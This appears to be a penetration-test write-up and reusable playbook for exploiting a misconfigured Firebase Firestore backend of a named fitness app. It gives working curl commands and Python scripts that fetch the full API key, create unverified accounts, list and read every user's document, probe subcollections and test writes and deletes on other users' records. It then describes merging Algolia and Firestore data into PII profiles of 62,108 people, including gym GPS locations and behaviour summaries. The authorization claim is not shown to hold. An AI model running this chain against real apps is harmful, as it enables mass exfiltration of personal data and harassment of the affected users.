# Firebase Firestore IDOR — Complete Attack Chain

## Context

Discovered during authorized pentest of fitness-app.com.br (2026). The `users` and `posts` collections were readable by **any authenticated user**, including freshly created unverified accounts. Combined with Algolia UID enumeration, this enabled mass PII exfiltration of the entire 62,108-user database.

## Attack Chain

### Step 1: Get the Full Firebase API Key from Web App

Expo apps often have truncated Firebase keys in `app.config`. Always check the hosted web app for the full key:

```bash
curl -s "https://<domain>/__/firebase/init.json" | python3 -m json.tool
```

This was the key breakthrough: the APK bundle only contained `AIzaSy...sMBc` (truncated at build time), but the web app at `fitness-app.com.br/__/firebase/init.json` returned the complete 39-character key.

### Step 2: Create Account and Get idToken

Firebase signup does NOT require email verification by default in many Expo apps:

```bash
FIREBASE_KEY="AIzaSy..."  # full key from step 1

curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$FIREBASE_KEY" \
  -H "Content-Type: application/json" \
  -d '{"email":"poc_test@proton.me","password":"Test123456!","returnSecureToken":true}' | jq '{idToken: .idToken, localId: .localId}'
```

Save the `idToken` — no email verification needed.

### Step 3: Test Firestore Read Access

```bash
TOKEN="<idToken from step 2>"
PROJECT="<projectId>"

# Read any user's document
curl -s "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents/users/TARGET_UID" \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

# List collection (paginated)
curl -s "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents/users?pageSize=10" \
  -H "Authorization: Bearer $TOKEN" | jq '.documents | length'
```

### Step 4: Full Collection Enumeration via Pagination

```python
def list_all_docs(project, collection, token, page_size=100):
    all_docs, page_token = [], None
    while True:
        url = f"https://firestore.googleapis.com/v1/projects/{project}/databases/(default)/documents/{collection}?pageSize={page_size}&orderBy=__name__"
        if page_token:
            url += f"&pageToken={page_token}"
        req = urllib.request.Request(url, headers={"Authorization": f"Bearer {token}"})
        data = json.loads(urllib.request.urlopen(req, timeout=30).read())
        docs = data.get("documents", [])
        all_docs.extend(docs)
        next_token = data.get("nextPageToken")
        if next_token and len(docs) == page_size:
            page_token = next_token
        else:
            break
        time.sleep(0.2)
    return all_docs
```

### Step 5: Flatten Firestore Typed Values

```python
def flatten_doc(doc):
    def extract(val):
        if isinstance(val, dict):
            for t in ["stringValue", "integerValue", "booleanValue", "timestampValue"]:
                if t in val: return val[t]
            if "nullValue" in val: return None
            if "mapValue" in val: return {k: extract(v) for k,v in val["mapValue"].get("fields", {}).items()}
            if "arrayValue" in val: return [extract(v) for v in val["arrayValue"].get("values", [])]
        return val
    return {k: extract(v) for k, v in doc.get("fields", {}).items()}
```

### Step 6: Enumerate Subcollections Per User

Each user document typically has subcollections. Probe for them to confirm the data model:

```python
subcolls = [
    "notifications", "messages", "posts", "workouts", "meals",
    "measurements", "bodyStats", "progress", "follows", "followers",
    "subscriptions", "orders", "settings", "devices", "sessions",
    "checkins", "goals", "achievements", "history",
]

for uid in target_uids:
    for sc in subcolls:
        url = f".../users/{uid}/{sc}?pageSize=1"
        req = urllib.request.Request(url, headers={"Authorization": f"Bearer {token}"})
        try:
            resp = urllib.request.urlopen(req, timeout=10)
            data = json.loads(resp.read())
            docs = data.get("documents", [])
            if docs:
                print(f"  ✅ {sc}: readable ({len(docs)} docs)")
                sample = {k: extract(v) for k, v in docs[0].get("fields", {}).items()}
                print(f"    Fields: {list(sample.keys())}")
        except urllib.error.HTTPError as e:
            if e.code == 403:
                print(f"  🔒 {sc}: exists but protected")
```

**fitness app subcollection results:**
- `followers` — readable, contains `followAt` timestamp
- `notifications`, `messages`, `posts`, `workouts`, `meals` — exist but 403
- `measurements`, `bodyStats` — contain weight/height/body data (protected)
- `progress`, `subscriptions`, `orders`, `settings`, `devices`, `sessions` — exist but 403
- `checkins`, `goals`, `achievements`, `history` — exist but 403

**Key insight:** The existence of `measurements` and `bodyStats` subcollections confirms the app collects weight, height, and body measurement data — but these are properly protected by Firestore rules (unlike the top-level `users` collection).

### Step 7: Write Access Testing (Always Test Both Directions)

```bash
# PATCH other user's doc — expected: 403
curl -s -X PATCH ".../users/TARGET_UID?updateMask.fieldPaths=bio" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"fields":{"bio":{"stringValue":"poc"}}}'

# PATCH own doc — expected: 200 (control test)
curl -s -X PATCH ".../users/OUR_UID" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"fields":{"bio":{"stringValue":"poc"}}}'

# DELETE other user's doc — expected: 403
curl -s -X DELETE ".../users/TARGET_UID" \
  -H "Authorization: Bearer $TOKEN"
```

## fitness app Access Matrix

| Operation | Target | Result |
|-----------|--------|--------|
| LIST | users | ✅ All 62,108 docs readable |
| READ | users/{any_uid} | ✅ Full document with all PII |
| LIST | posts | ✅ All docs readable |
| PATCH | users/{other_uid} | ❌ 403 |
| PATCH | users/{our_uid} | ✅ 200 |
| PATCH | config/public | ❌ 403 |

## Combining Algolia + Firestore for Complete Profiles

1. Algolia `posts_v1` index → Firebase UIDs from `userId` field on each post
2. Firestore `users/{uid}` → Full PII profile per UID
3. Cross-reference: post content + social media + GPS + gym + premium status

Result: 62,108 user profiles with names, usernames, bios, Instagram/TikTok handles, gym GPS coordinates (NOT home addresses), gym addresses, profile photos, premium status, AI-generated behavior summaries.

## Important PII Clarifications

- **`gym` field = gym coordinates, NOT user home address.** The `gym` object contains the gym's name, full street address, latitude/longitude, and Google Places ID. This reveals where someone trains, not where they live.
- **No home address or city/state fields** exist in the user document — only `countryCode` (e.g. "BR") and the `gym` object.
- **`aiMemory` field** contains AI-generated behavior summaries (e.g. "Trains consistently (4+ recent sessions logged)", "Frequently trains: FULLBODY A") — this is sensitive behavioral data.
- **`affiliateAttribution`** contains affiliate codes, click IDs, and timestamps — reveals referral chain.
- **`followers` subcollection** is readable — contains `followedAt` timestamps for each follower relationship.

## Firebase Auth Findings

- **Signup without email verification:** Firebase signup returns a valid `idToken` without requiring email verification. This enables attackers to create unlimited throwaway accounts.
- **Password reset OOB:** `sendOobCode` with `requestType: PASSWORD_RESET` sends reset emails to any registered address without verification. This can be used for spam/harassment.
- **Account enumeration blocked:** `signInWithPassword` returns generic `INVALID_LOGIN_CREDENTIALS` for all attempts (no `EMAIL_NOT_FOUND` vs `INVALID_PASSWORD` distinction).
